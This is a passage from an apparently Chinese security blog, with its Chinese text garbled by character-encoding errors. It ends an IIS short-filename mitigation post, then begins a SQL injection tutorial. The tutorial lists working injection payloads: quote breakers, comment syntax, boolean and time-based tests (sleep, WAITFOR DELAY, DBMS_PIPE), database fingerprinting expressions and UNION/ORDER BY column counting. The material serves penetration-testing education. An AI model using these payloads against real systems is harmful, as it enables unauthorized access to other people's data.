<p><strong>2. ä¿®æ”¹æ³¨å†Œè¡¨ç¦ç”¨çŸ­æ–‡ä»¶ååŠŸèƒ½</strong><br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystemï¼Œå°†å…¶ä¸­çš„ NtfsDisable8dot3NameCreation è¿™ä¸€é¡¹çš„å€¼è®¾ä¸º 1ï¼Œ1ä»£è¡¨ä¸åˆ›å»ºçŸ­æ–‡ä»¶åæ ¼å¼<br>ä¿®æ”¹å®Œæˆåï¼Œéœ€è¦é‡å¯ç³»ç»Ÿç”Ÿæ•ˆ</p>
<blockquote>
<p>æ³¨ï¼šæ­¤æ–¹æ³•åªèƒ½ç¦æ­¢NTFS8.3æ ¼å¼æ–‡ä»¶ååˆ›å»º,å·²ç»å­˜åœ¨çš„æ–‡ä»¶çš„çŸ­æ–‡ä»¶åæ— æ³•ç§»é™¤ï¼Œéœ€è¦é‡æ–°å¤åˆ¶æ‰ä¼šæ¶ˆå¤±ã€‚</p>
</blockquote>
<p><em>ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ä»…é€‚ç”¨äºç¼“è§£GET æ–¹æ³•ï¼Œå…¶ä»–æ–¹æ³•ä¾æ—§å¯ä»¥çŒœè§£ã€‚</em><br><strong>3. å…³é—­WebæœåŠ¡æ‰©å±•- ASP.NET</strong><br><strong>4. å‡çº§netFrameworkè‡³4.0ä»¥ä¸Šç‰ˆæœ¬</strong></p>
<h2 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04-å‚è€ƒ"></a>0x04-å‚è€ƒ</h2><p>å¤‡ä»½æ–‡ä»¶åœ¨ç‰¹å®šç¯å¢ƒä¸‹ï¼ˆapacheï¼‰å¯è¢«ä»»æ„ä¸‹è½½ï¼ˆåˆ©ç”¨windowsçŸ­æ–‡ä»¶åï¼‰ï¼š<a target="_blank" rel="noopener" href="http://www.jinglingshu.org/?p=6039%5C">http://www.jinglingshu.org/?p=6039\</a><br>IISçŸ­æ–‡ä»¶åæ¼æ´çŸ¥è¯†ï¼š<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/SQLi-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="singsing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="singsing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/19/SQLi-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">SQLi åŸºç¡€çŸ¥è¯†</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-19 15:15:06 / Modified: 19:10:24" itemprop="dateCreated datePublished" datetime="2022-03-19T15:15:06+08:00">2022-03-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SQLi/" itemprop="url" rel="index"><span itemprop="name">SQLi</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ</h2><p>SQL æ³¨å…¥æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…<strong>å¹²æ‰°</strong>åº”ç”¨ç¨‹åºå¯¹å…¶<strong>æ•°æ®åº“</strong>çš„<strong>æŸ¥è¯¢</strong>ã€‚å®ƒé€šå¸¸å…è®¸æ”»å‡»è€…<strong>æŸ¥çœ‹ä»–ä»¬é€šå¸¸æ— æ³•æ£€ç´¢çš„æ•°æ®</strong>ã€‚è¿™å¯èƒ½åŒ…æ‹¬å±äº<strong>å…¶ä»–ç”¨æˆ·</strong>çš„æ•°æ®ï¼Œæˆ–<strong>åº”ç”¨ç¨‹åº</strong>æœ¬èº«èƒ½å¤Ÿ<strong>è®¿é—®</strong>çš„ä»»ä½•å…¶ä»–æ•°æ®ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥<strong>ä¿®æ”¹</strong>æˆ–<strong>åˆ é™¤</strong>æ­¤æ•°æ®ï¼Œä»è€Œå¯¼è‡´å¯¹åº”ç”¨ç¨‹åºçš„å†…å®¹æˆ–è¡Œä¸ºçš„æŒç»­æ›´æ”¹ã€‚<br>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥å‡çº§ SQL æ³¨å…¥æ”»å‡»ä»¥<strong>å±å®³åº•å±‚æœåŠ¡å™¨</strong>æˆ–å…¶ä»–åç«¯åŸºç¡€è®¾æ–½ï¼Œæˆ–æ‰§è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ ï¼ˆæ¥è‡ª<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">è¿™é‡Œ</a>ï¼‰ã€‚ </p>
<blockquote>
<p>åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å°†å‡è®¾æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå¯èƒ½çš„ SQL æ³¨å…¥ï¼Œæˆ‘ä»¬å°†è®¨è®ºç¡®è®¤ SQL æ³¨å…¥ã€æ•°æ®åº“è¯†åˆ«å’Œæ‰§è¡Œæ“ä½œçš„å¯èƒ½æ–¹æ³•ã€‚</p>
</blockquote>
<h2 id="å…¥å£ç‚¹æ£€æµ‹"><a href="#å…¥å£ç‚¹æ£€æµ‹" class="headerlink" title="å…¥å£ç‚¹æ£€æµ‹"></a>å…¥å£ç‚¹æ£€æµ‹</h2><p>æ‚¨å¯èƒ½å·²ç»å‘ç°äº†ä¸€ä¸ªå­˜åœ¨ <code>SQLi</code> çš„ç«™ç‚¹ï¼Œå› ä¸ºæœåŠ¡å™¨åœ¨æ¥æ”¶å«æœ‰ <code>SQL</code> ç›¸å…³è¯­å¥çš„è¾“å…¥æ—¶è¡¨ç°å¼‚å¸¸ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯å¦‚ä½•åœ¨ä¸ç ´å <code>SQL</code> è¯­æ³•çš„å‰æä¸‹æ³¨å…¥æ•°æ®ã€‚ </p>
<p>æµ‹è¯• PayLoadï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> [Nothing]</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">&#x27;</span>)</span><br><span class="line"><span class="string">&quot;)</span></span><br><span class="line"><span class="string">`)</span></span><br><span class="line"><span class="string">&#x27;))</span></span><br><span class="line"><span class="string">&quot;</span>))`</span><br><span class="line">`))</span><br></pre></td></tr></table></figure>

<p>ç„¶åï¼Œæ‚¨éœ€è¦çŸ¥é“å¦‚ä½•<strong>ä¿®å¤æŸ¥è¯¢ï¼Œä»¥å…å‡ºç°é”™è¯¯</strong>ã€‚ä¸ºäº†ä¿®å¤æŸ¥è¯¢ï¼Œæ‚¨å¯ä»¥ <strong>input</strong> æ•°æ®ï¼Œä»¥ä¾¿é—­åˆ <strong>previous query</strong>ï¼Œæˆ–è€…æ‚¨å¯ä»¥åª <strong>input</strong> æ‚¨çš„æ•°æ®å¹¶<strong>åœ¨æ•°æ®åé¢æ·»åŠ æ³¨é‡Šç¬¦</strong>ã€‚</p>
<p><em>è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å¯ä»¥çœ‹åˆ°é”™è¯¯æ¶ˆæ¯ï¼Œæˆ–è€…æ‚¨å¯ä»¥åœ¨æŸ¥è¯¢æ­£å¸¸å·¥ä½œå’Œä¸æ­£å¸¸å·¥ä½œæ—¶å‘ç°å·®å¼‚ï¼Œè¿™ä¸ªé˜¶æ®µä¼šæ›´å®¹æ˜“ã€‚</em></p>
<h3 id="æ³¨é‡Šç¬¦"><a href="#æ³¨é‡Šç¬¦" class="headerlink" title="æ³¨é‡Šç¬¦"></a><strong>æ³¨é‡Šç¬¦</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">MySQL</span><br><span class="line">#comment</span><br><span class="line"><span class="comment">-- comment     [Note the space after the double dash]</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"><span class="comment">/*! MYSQL Special SQL */</span></span><br><span class="line"><span class="comment">/*!50726 select version()*/</span> å‘ä½ç‰ˆæœ¬å…¼å®¹æ‰§è¡Œã€‚<span class="comment">/*!xxxxxx select version()*/</span> <span class="operator">&lt;=</span> <span class="number">5.7</span><span class="number">.26</span> ï¼Œæ‰§è¡Œ<span class="keyword">SQL</span>è¯­å¥ ï¼Œ<span class="operator">&gt;</span> <span class="number">5.7</span><span class="number">.26</span> ä½œä¸ºæ³¨é‡Šç¬¦ä½¿ç”¨ã€‚</span><br><span class="line"></span><br><span class="line">PostgreSQL</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"></span><br><span class="line">MSQL</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"></span><br><span class="line">Oracle</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"></span><br><span class="line">SQLite</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"></span><br><span class="line">HQL</span><br><span class="line">HQL does <span class="keyword">not</span> support comments</span><br></pre></td></tr></table></figure>
<h3 id="ç©ºç™½å­—ç¬¦"><a href="#ç©ºç™½å­—ç¬¦" class="headerlink" title="ç©ºç™½å­—ç¬¦"></a>ç©ºç™½å­—ç¬¦</h3><p>MySQL</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">09</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>A</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>B</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>C</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>D</span><br><span class="line"><span class="operator">%</span><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>Oracle</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">00</span></span><br><span class="line"><span class="operator">%</span><span class="number">09</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>A</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>B</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>C</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>D</span><br><span class="line"><span class="operator">%</span><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>MSSQL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00-%20</span><br></pre></td></tr></table></figure>

<h3 id="åŸºäºé€»è¾‘è¿ç®—ç¡®è®¤-SQLi"><a href="#åŸºäºé€»è¾‘è¿ç®—ç¡®è®¤-SQLi" class="headerlink" title="åŸºäºé€»è¾‘è¿ç®—ç¡®è®¤ SQLi"></a>åŸºäºé€»è¾‘è¿ç®—ç¡®è®¤ SQLi</h3><p>ç¡®è®¤ SQLi çš„æ–¹å¼ä¹‹ä¸€æ˜¯é€šè¿‡é€»è¾‘è¿ç®—ï¼Œå¹¶é€šè¿‡è¯¥è¿ç®—è·å¾—é¢„æœŸç»“æœã€‚å¦‚ <code>?username=Peter</code> å’Œ <code>?username=Peter&#39; or &#39;1&#39;=&#39;1</code> ï¼Œé€šè¿‡åœ¨å‚æ•°åé¢æ·»åŠ  SQL é€»è¾‘è¿ç®—è¡¨è¾¾å¼ï¼Œå½“ä¸¤ä¸ªè¯·æ±‚çš„å“åº”å†…å®¹ä¸€è‡´æ—¶ï¼Œå³å¾ˆå¯èƒ½è¯´æ˜ä½ å·²ç»æ‰¾åˆ°ä¸€ä¸ª SQLi æ¼æ´ã€‚</p>
<p>æˆ–è€…é€šè¿‡æ•°å­¦è¿ç®—çš„æ¦‚å¿µä¹Ÿå¯ä»¥ï¼Œ å¦‚ <code>?id=1</code> å’Œ <code>?id=2-1</code>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">page.asp?id=1 or 1=1 -- true</span><br><span class="line">page.asp?id=1&#x27; or 1=1 -- true</span><br><span class="line">page.asp?id=1&quot; or 1=1 -- true</span><br><span class="line">page.asp?id=1 and 1=2 -- false</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åŸºäºé€»è¾‘è¿ç®—çš„ SQLi æµ‹è¯•åˆ—è¡¨<br><a target="_blank" rel="noopener" href="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7d-n6kjX238xqV3-OB%2F-M7dsI5mMfPYjSqdzvtB%2Fsqli-logic.txt?alt=media&amp;token=6843509d-e5dd-4452-81d8-7a9b02de6a93">https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7d-n6kjX238xqV3-OB%2F-M7dsI5mMfPYjSqdzvtB%2Fsqli-logic.txt?alt=media&amp;token=6843509d-e5dd-4452-81d8-7a9b02de6a93</a></p>
</blockquote>
<h3 id="åŸºäºå“åº”æ—¶é—´ç¡®è®¤-SQLi"><a href="#åŸºäºå“åº”æ—¶é—´ç¡®è®¤-SQLi" class="headerlink" title="åŸºäºå“åº”æ—¶é—´ç¡®è®¤ SQLi"></a>åŸºäºå“åº”æ—¶é—´ç¡®è®¤ SQLi</h3><p>æŸäº›æƒ…å†µï¼Œä½¿ç”¨åŸºäºé€»è¾‘è¿ç®—çš„æ–¹å¼å¯èƒ½å¾—ä¸åˆ°é¢„æœŸçš„ç»“æœï¼Œå› ä¸ºæŸäº›åŸå› å¯¼è‡´å“åº”ç»“æœå¹¶æ²¡æœ‰å˜åŒ–ã€‚æ‰€ä»¥éœ€è¦åŸºäºå“åº”æ—¶é—´çš„æ–¹å¼å»ç¡®è®¤ SQLiã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰§è¡Œè¯¸å¦‚ <code>sleep()</code>ç­‰å‡½æ•°ï¼Œæˆ–è€…æ‰§è¡Œå¤æ‚çš„æ•°æ®å¤„ç†è¯·æ±‚ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MySQL (string concat and logical ops) # å­—ç¬¦ä¸²è¿æ¥åŠé€»è¾‘è¿ç®—</span><br><span class="line">1&#x27; + sleep(10)</span><br><span class="line">1&#x27; and sleep(10)</span><br><span class="line">1&#x27; &amp;&amp; sleep(10)</span><br><span class="line">1&#x27; | sleep(10)</span><br><span class="line"></span><br><span class="line">PostgreSQL (only support string concat)</span><br><span class="line">1&#x27; || pg_sleep(10)</span><br><span class="line"></span><br><span class="line">MSQL</span><br><span class="line">1&#x27; WAITFOR DELAY &#x27;0:0:10&#x27;</span><br><span class="line"></span><br><span class="line">Oracle</span><br><span class="line">1&#x27; AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;[RANDSTR]&#x27;,[SLEEPTIME])</span><br><span class="line">1&#x27; AND 123=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;ASD&#x27;,10)</span><br><span class="line"></span><br><span class="line">SQLite</span><br><span class="line">1&#x27; AND [RANDNUM]=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</span><br><span class="line">1&#x27; AND 123=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))</span><br></pre></td></tr></table></figure>

<h3 id="ç¡®è®¤æ•°æ®åº“ç±»å‹"><a href="#ç¡®è®¤æ•°æ®åº“ç±»å‹" class="headerlink" title="ç¡®è®¤æ•°æ®åº“ç±»å‹"></a>ç¡®è®¤æ•°æ®åº“ç±»å‹</h3><p>ç¡®è®¤æ•°æ®åº“ç±»å‹çš„æ–¹å¼ä¹‹ä¸€æ˜¯ä½¿ç”¨å„æ•°æ®åº“ä¸“æœ‰çš„ï¼ŒåŒºåˆ«ä¸å…¶ä»–æ•°æ®åº“çš„å‡½æ•°ï¼Œè¯¦è§ä¸‹è¡¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;conv(&#x27;a&#x27;,16,2)=conv(&#x27;a&#x27;,16,2)&quot;</span>                   ,<span class="string">&quot;MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;connection_id()=connection_id()&quot;</span>                 ,<span class="string">&quot;MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;crc32(&#x27;MySQL&#x27;)=crc32(&#x27;MySQL&#x27;)&quot;</span>                   ,<span class="string">&quot;MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)&quot;</span>       ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;@@CONNECTIONS&gt;0&quot;</span>                                 ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;@@CONNECTIONS=@@CONNECTIONS&quot;</span>                     ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;@@CPU_BUSY=@@CPU_BUSY&quot;</span>                           ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;USER_ID(1)=USER_ID(1)&quot;</span>                           ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;ROWNUM=ROWNUM&quot;</span>                                   ,<span class="string">&quot;ORACLE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;RAWTOHEX(&#x27;AB&#x27;)=RAWTOHEX(&#x27;AB&#x27;)&quot;</span>                   ,<span class="string">&quot;ORACLE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;LNNVL(0=123)&quot;</span>                                    ,<span class="string">&quot;ORACLE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;5::int=5&quot;</span>                                        ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;5::integer=5&quot;</span>                                    ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;pg_client_encoding()=pg_client_encoding()&quot;</span>       ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;get_current_ts_config()=get_current_ts_config()&quot;</span> ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;quote_literal(42.5)=quote_literal(42.5)&quot;</span>         ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;current_database()=current_database()&quot;</span>           ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;sqlite_version()=sqlite_version()&quot;</span>               ,<span class="string">&quot;SQLITE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;last_insert_rowid()&gt;1&quot;</span>                           ,<span class="string">&quot;SQLITE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;last_insert_rowid()=last_insert_rowid()&quot;</span>         ,<span class="string">&quot;SQLITE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;val(cvar(1))=1&quot;</span>                                  ,<span class="string">&quot;MSACCESS&quot;</span>],</span><br><span class="line">[<span class="string">&quot;IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0&quot;</span>               ,<span class="string">&quot;MSACCESS&quot;</span>],</span><br><span class="line">[<span class="string">&quot;cdbl(1)=cdbl(1)&quot;</span>                                 ,<span class="string">&quot;MSACCESS&quot;</span>],</span><br><span class="line">[<span class="string">&quot;1337=1337&quot;</span>,   <span class="string">&quot;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;&#x27;i&#x27;=&#x27;i&#x27;&quot;</span>,     <span class="string">&quot;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&quot;</span>],</span><br></pre></td></tr></table></figure>

<p>æ­¤å¤–ï¼Œå¦‚æœåº”ç”¨ç¨‹åºèƒ½å¤Ÿå›æ˜¾æŸ¥è¯¢çš„æ•°æ®ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å¦‚ï¼š <code>uniont select version()</code> ç­‰æ–¹å¼ç›´æ¥æŸ¥è¯¢æ•°æ®åº“ç±»å‹åŠç‰ˆæœ¬ã€‚</p>
<p><strong>å¦‚å†‡ç‰¹åˆ«è¯´æ˜ï¼Œä»¥ä¸‹ä¾‹å­ä½¿ç”¨å‡é»˜è®¤ä½¿ç”¨ MySQL ä½œä¸ºç¤ºä¾‹ï¼š</strong></p>
<h2 id="åŸºäº-union-çš„æ³¨å…¥"><a href="#åŸºäº-union-çš„æ³¨å…¥" class="headerlink" title="åŸºäº union çš„æ³¨å…¥"></a>åŸºäº union çš„æ³¨å…¥</h2><h3 id="æ£€æµ‹å­—æ®µæ•°"><a href="#æ£€æµ‹å­—æ®µæ•°" class="headerlink" title="æ£€æµ‹å­—æ®µæ•°"></a>æ£€æµ‹å­—æ®µæ•°</h3><p>å¦‚æœå¯ä»¥å›æ˜¾æŸ¥è¯¢çš„æ•°æ®ï¼Œ åŸºäº union çš„æ³¨å…¥æ˜¯ SQLi äº”ç§åŸºæœ¬æ³¨å…¥ç±»å‹ä¸­æœ€ä¼˜çš„æ”»å‡»æ–¹å¼ã€‚æ•°æ®æŸ¥è¯¢è¯­å¥è¯­æ³•è§„å®šï¼Œunion æŸ¥è¯¢æ—¶ï¼Œä¸»æŸ¥è¯¢ä¸å­æŸ¥è¯¢å¿…é¡»å¿…é¡»è¦æœ‰ç›¸åŒçš„å­—æ®µæ•°æ‰èƒ½æ­£ç¡®æ‰§è¡Œã€‚æ‰€ä»¥ï¼Œä¸ºäº†æ‰§è¡Œ union æ³¨å…¥ï¼Œé¦–å…ˆéœ€è¦ç¡®å®šåŸå§‹SQLæŸ¥è¯¢è¯­å¥ä¸­æ¶‰åŠåˆ°å¤šå°‘çš„å­—æ®µæ•°ã€‚ </p>
<p>é€šå¸¸ä½¿ç”¨å¦‚ä¸‹ä¸¤ç§æ–¹å¼å»ç¡®è®¤åŸå§‹æŸ¥è¯¢è¯­å¥æ¶‰åŠçš„å­—æ®µæ•°ã€‚</p>
<h4 id="Order-x2F-Group-by"><a href="#Order-x2F-Group-by" class="headerlink" title="Order&#x2F;Group by"></a>Order&#x2F;Group by</h4><p>é€’å¢ <code>Order/Group by</code> åé¢çš„æ•°å€¼ï¼Œç›´è‡³åº”ç”¨ç¨‹åºå“åº”ä¸åŒçš„é¡µé¢å†…å®¹ã€‚å³ä½¿ <code>GROUP BY</code> å’Œ <code>ORDER BY</code> åœ¨ SQL ä¸­åŠŸèƒ½å¹¶ä¸ä¸€æ ·ï¼Œä½†æ˜¯ä¸¤è€…éƒ½å¯ä»¥ç”¨ä½œç¡®è®¤å­—æ®µæ•°ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 1--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2</span><span class="comment">--+    #True</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 3--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">4</span><span class="comment">--+    #False - Query is only using 3 columns</span></span><br><span class="line">                        #<span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,3--+    True</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; GROUP BY 1--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="number">2</span><span class="comment">--+    #True</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; GROUP BY 3--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="number">4</span><span class="comment">--+    #False - Query is only using 3 columns</span></span><br><span class="line">                        #<span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,3--+    True</span></span><br></pre></td></tr></table></figure>

<h4 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h4><p>å¢åŠ  <code>null</code> å€¼ï¼Œç›´æ¥åº”ç”¨ç¨‹åºè¿”å›æ­£ç¡®çš„å“åº”ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT null-- - Not working</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">null</span>,<span class="keyword">null</span><span class="comment">-- - Not working</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT null,null,null-- - Worked</span></span><br></pre></td></tr></table></figure>

<p><em>æ‚¨åº”è¯¥ä½¿ç”¨ <code>null</code> å€¼ï¼Œå› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒæŸ¥è¯¢åŒæ–¹çš„å­—æ®µç±»å‹å¿…é¡»ç›¸åŒï¼Œè€Œ <code>null</code> åœ¨æ¯ç§æƒ…å†µä¸‹éƒ½æœ‰æ•ˆã€‚</em></p>
